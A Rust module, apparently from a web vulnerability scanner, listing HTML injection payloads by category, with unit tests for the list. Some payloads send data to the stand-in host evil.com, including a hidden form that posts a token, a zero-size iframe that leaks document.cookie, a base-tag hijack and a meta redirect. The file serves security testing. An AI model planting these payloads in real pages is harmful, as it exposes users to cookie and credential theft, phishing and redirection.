use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::HtmlInject,
        "basic", [
            ("<h1>Injected</h1>", "Header injection", Severity::Medium),
            ("<b>Bold Text</b>", "Bold injection", Severity::Low),
            ("<img src=x>", "Image tag without event handler", Severity::Medium),
            ("<a href=\"http://evil.com\">Click Here</a>", "Link injection", Severity::High),
            ("<div>Injected Content</div>", "Div injection", Severity::Medium),
            ("<p>Injected Paragraph</p>", "Paragraph injection", Severity::Low),
            ("<br>", "Line break injection", Severity::Low),
            ("<hr>", "Horizontal rule injection", Severity::Low),
        ];
        "form", [
            ("<form action=\"http://evil.com\"><input type=\"submit\"></form>", "Form to external site", Severity::High),
            ("<form method=\"POST\" action=\"http://evil.com/steal\"><input name=\"token\" type=\"hidden\" value=\"stolen\"></form>", "Data exfil form", Severity::Critical),
            ("<form><input type=\"text\" placeholder=\"Enter password\"></form>", "Fake login field", Severity::High),
            ("<form action=\"http://evil.com\" method=\"GET\"><input name=\"q\" value=\"test\"></form>", "GET form", Severity::Medium),
            ("<input type=\"text\" value=\"Injected\">", "Input field injection", Severity::Medium),
            ("<textarea>Injected Content</textarea>", "Textarea injection", Severity::Medium),
        ];
        "svg", [
            ("<svg><circle cx=\"50\" cy=\"50\" r=\"40\"></circle></svg>", "SVG circle", Severity::Medium),
            ("<svg width=\"100\" height=\"100\"><rect width=\"100\" height=\"100\"></rect></svg>", "SVG rectangle", Severity::Medium),
            ("<svg><text x=\"10\" y=\"20\">Injected</text></svg>", "SVG text", Severity::Medium),
            ("<svg><image href=\"http://evil.com/track.png\"></image></svg>", "SVG image load", Severity::High),
            ("<svg><use href=\"http://evil.com/evil.svg#payload\"></use></svg>", "SVG use injection", Severity::High),
        ];
        "meta", [
            ("<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">", "Meta refresh redirect", Severity::High),
            ("<meta name=\"description\" content=\"Injected Description\">", "Meta description", Severity::Medium),
            ("<link rel=\"stylesheet\" href=\"http://evil.com/evil.css\">", "CSS link injection", Severity::High),
            ("<base href=\"http://evil.com/\">", "Base tag hijack", Severity::Critical),
        ];
        "style", [
            ("<div style=\"background-image:url(http://evil.com/track.png)\">Styled</div>", "Style background", Severity::High),
            ("<div style=\"width:100px;height:100px;background:red\">Box</div>", "Style box", Severity::Low),
            ("<span style=\"color:red\">Red Text</span>", "Style text color", Severity::Low),
            ("<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8)\">Overlay</div>", "Overlay injection", Severity::High),
        ];
        "iframe", [
            ("<iframe src=\"http://evil.com\"></iframe>", "Iframe to external", Severity::High),
            ("<iframe srcdoc=\"<h1>Injected</h1>\"></iframe>", "Iframe srcdoc", Severity::High),
            ("<iframe width=\"0\" height=\"0\" src=\"http://evil.com/steal.php?cookie=document.cookie\"></iframe>", "Hidden iframe", Severity::Critical),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(
            !payloads.is_empty(),
            "HTML injection payloads must not be empty"
        );
    }

    #[test]
    fn all_payloads_are_html_inject_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::HtmlInject);
        }
    }

    #[test]
    fn contains_basic_html_tags() {
        let payloads = get_payloads();
        let has_tags = payloads.iter().any(|p| {
            p.payload.contains("<h1>")
                || p.payload.contains("<div>")
                || p.payload.contains("<img")
                || p.payload.contains("<a ")
        });
        assert!(has_tags, "Must contain basic HTML tag payloads");
    }

    #[test]
    fn contains_form_payloads() {
        let payloads = get_payloads();
        let has_form = payloads
            .iter()
            .any(|p| p.tags.contains(&"form".to_string()));
        assert!(has_form, "Must contain form injection payloads");
    }

    #[test]
    fn contains_svg_payloads() {
        let payloads = get_payloads();
        let has_svg = payloads.iter().any(|p| p.tags.contains(&"svg".to_string()));
        assert!(has_svg, "Must contain SVG injection payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 20,
            "Must have substantial HTML injection payload coverage, got {}",
            payloads.len()
        );
    }
}
